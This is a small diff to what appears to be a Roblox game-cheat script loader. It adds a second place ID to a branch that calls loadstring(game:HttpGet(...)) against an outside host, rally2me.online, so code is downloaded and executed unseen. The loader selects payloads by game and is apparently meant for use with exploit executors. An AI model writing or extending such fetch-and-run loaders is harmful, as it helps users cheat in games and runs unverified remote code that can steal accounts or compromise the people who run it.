@@ -1,7 +1,7 @@
 local PlaceId = game.PlaceId
 local Player = game:GetService("Players").LocalPlayer
 
-if PlaceId == 2788229376 then --DH
+if PlaceId == 2788229376 or PlaceId == 1008451066  then --DH
   loadstring(game:HttpGet("http://rally2me.online/load/2dfd31d3aa16"))()
 
 elseif PlaceId == 138995385694035 or PlaceId == 9825515356 then --HC
